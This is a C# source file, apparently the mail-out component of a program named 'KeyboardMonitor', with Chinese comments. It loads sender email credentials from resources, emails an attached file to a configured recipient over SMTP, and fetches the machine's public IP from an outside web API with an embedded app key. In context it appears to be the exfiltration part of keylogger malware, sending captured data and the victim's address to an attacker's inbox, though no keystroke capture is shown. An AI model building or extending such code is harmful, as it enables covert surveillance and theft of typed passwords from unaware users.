using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Mail;
using System.Net;

namespace KeyboardMonitor.Common
{
	public class Commit:IDisposable
	{

		/// <summary>
		/// 发件人邮箱
		/// </summary>
		public string FormDataEmail = "";
		/// <summary>
		/// 发件人邮箱密码
		/// </summary>
		public string FormDataEmailPassword = "";
		/// <summary>
		/// 收件人邮箱
		/// </summary>
		public string ToDataEmail = "";
		/// <summary>
		/// 发送邮件服务器端口
		/// </summary>
		public int EmailPort = 25;
		/// <summary>
		/// 发件人邮箱服务器
		/// </summary>
		public string EmailHost = "";
		/// <summary>
		/// 发件人信息凭证
		/// </summary>
		public NetworkCredential networkCredential = null;
		/// <summary>
		/// 邮件对象
		/// </summary>
		public MailMessage mailMessage = null;
		/// <summary>
		/// 发送邮件的传输协议
		/// </summary>
		public SmtpClient smtpClient = null;
		public Commit()
		{
			this.InitCommit();
		}
		/// <summary>
		/// 初始化Commit
		/// </summary>
		private void InitCommit()
		{
			this.FormDataEmail = global::KeyboardMonitor.Properties.Resource.FormDataEmail;
			this.FormDataEmailPassword = global::KeyboardMonitor.Properties.Resource.FormDataEmailPassword;
			this.EmailHost= global::KeyboardMonitor.Properties.Resource.EmailMSTP;
			this.EmailPort = int.Parse(global::KeyboardMonitor.Properties.Resource.EmailServicePort);
			this.mailMessage = new MailMessage();
			this.smtpClient = new SmtpClient();
			this.networkCredential = new NetworkCredential(this.FormDataEmail,this.FormDataEmailPassword);
		}
		/// <summary>
		/// 
		/// </summary>
		/// <param name="form"></param>
		/// <param name="to"></param>
		/// <param name="subject"></param>
		/// <param name="body"></param>
		/// <param name="attachment"></param>
		/// <param name="EnableSsl"></param>
		public void SendEmail(NetworkCredential form,string[] to,string subject,string body,string attachment,bool EnableSsl=false)
		{
			this.mailMessage.From = new MailAddress(form.UserName);
			foreach (string item in to)
			{
				this.mailMessage.To.Add(item);
			}
			this.mailMessage.BodyEncoding = Encoding.GetEncoding("GB2312") ;
			//this.mailMessage.Sender
			this.mailMessage.Subject = subject;
			this.mailMessage.Body = body;
			this.mailMessage.Attachments.Add(new Attachment(attachment));
			this.smtpClient.Host = this.EmailHost;
			this.smtpClient.EnableSsl = EnableSsl;
			this.smtpClient.Credentials = new NetworkCredential(form.UserName, form.Password);
			this.smtpClient.Port = this.EmailPort;
			this.smtpClient.Send(this.mailMessage);
			this.mailMessage.Dispose();
			this.smtpClient.Dispose();
		}
		/// <summary>
		/// 通过WebService获得当前电脑ip
		/// </summary>
		/// <returns></returns>
		public string GetIP()
		{
			using (HttpHelper httpHelper = new HttpHelper())
			{
				HttpItem item = new HttpItem()
				{
					URL = "http://api.k780.com/?app=ip.local&appkey=10003&sign=b59bc3ef6191eb9f747dd4e83c99f2a4&format=json",//URL     必需项
					Method = "post",//URL     可选项 默认为Get
							//IsToLower = false,//得到的HTML代码是否转成小写     可选项默认转小写
							//Cookie = "",//字符串Cookie     可选项
							//Referer = "",//来源URL     可选项
							//	     //Postdata = jsonData.ToString(),//Post数据     可选项GET时不需要写
							//PostEncoding = Encoding.UTF8,
							//Timeout = 100000,//连接超时时间     可选项默认为100000
							//ReadWriteTimeout = 30000,//写入Post数据超时时间     可选项默认为30000
							//UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",//用户的浏览器类型，版本，操作系统     可选项有默认值
							//ContentType = "application/x-www-form-urlencoded",//返回类型    可选项有默认值
							//Allowautoredirect = true,//是否根据301跳转     可选项
							//			 //CerPath = "d:\123.cer",//证书绝对路径     可选项不需要证书时可以不写这个参数
							//			 //Connectionlimit = 1024,//最大连接数     可选项 默认为1024
							//ProxyIp = "",//代理服务器ID     可选项 不需要代理 时可以不设置这三个参数
							//	     //ProxyPwd = "123456",//代理服务器密码     可选项
							//	     //ProxyUserName = "administrator",//代理服务器账户名     可选项
							//ResultType = ResultType.String
				};
				HttpResult result = httpHelper.GetHtml(item);
				string html = result.Html;
				dynamic ip = new
				{
					success = "",
					result = new
					{
						ip = "",
						proxy = "",
						att = "",
						operators = "",
					},
				};
				ip = Newtonsoft.Json.JsonConvert.DeserializeObject(html, ip.GetType());
				return ip.result.ip;
			}

		}

		#region IDisposable Support
		private bool disposedValue = false; // 要检测冗余调用

		protected virtual void Dispose(bool disposing)
		{
			if (!disposedValue)
			{
				if (disposing)
				{
					// TODO: 释放托管状态(托管对象)。
				}

				// TODO: 释放未托管的资源(未托管的对象)并在以下内容中替代终结器。
				// TODO: 将大型字段设置为 null。

				disposedValue = true;
			}
		}

		// TODO: 仅当以上 Dispose(bool disposing) 拥有用于释放未托管资源的代码时才替代终结器。
		// ~Commit() {
		//   // 请勿更改此代码。将清理代码放入以上 Dispose(bool disposing) 中。
		//   Dispose(false);
		// }

		// 添加此代码以正确实现可处置模式。
		void IDisposable.Dispose()
		{
			// 请勿更改此代码。将清理代码放入以上 Dispose(bool disposing) 中。
			Dispose(true);
			// TODO: 如果在以上内容中替代了终结器，则取消注释以下行。
			// GC.SuppressFinalize(this);
		}
		#endregion
	}
}
